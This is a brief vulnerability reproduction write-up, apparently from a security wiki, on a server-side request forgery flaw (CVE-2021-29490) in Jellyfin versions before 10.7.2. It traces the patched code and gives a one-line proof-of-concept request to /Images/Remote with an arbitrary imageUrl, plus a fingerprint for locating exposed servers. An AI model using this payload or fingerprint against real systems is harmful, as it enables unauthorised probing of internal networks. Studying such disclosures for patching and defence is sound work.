# Jellyfin RemoteImageController.cs SSRF Vulnerability CVE-2021-29490

## Vulnerability Description

There is an SSRF vulnerability in the Jellyfin RemoteImageController.cs file. By constructing special requests, detecting intranet information.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Jellyfin < 10.7.2</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="Jellyfin"</span>

## Vulnerability reappears

Find the modified file in the official update file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639026469087-918a2c7f-b015-4a28-a885-00f9a7267d75.png)

Officially deleted a method

```go
function getDisplayUrl(url, apiClient) {
        return apiClient.getUrl('Images/Remote', { imageUrl: url });
    }
```

Download the source code of the vulnerable version and find the corresponding files of the interface.

`Jellyfin.Api/Controllers/RemoteImageController.cs`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639026630565-84275017-5bbf-4835-8d2f-c7eaf1aff942.png) The received parameter is imageUrl, and there is an SSRF vulnerability in subsequent code snippets

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639026730098-5b7473f3-32b0-47ee-bb04-6f69c13202a0.png)

Construct request POC

```go
/Images/Remote?imageUrl=http://www.baidu.com
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639026826430-ef5e3b8a-d7cb-4957-a71d-b9af01c57c1b.png)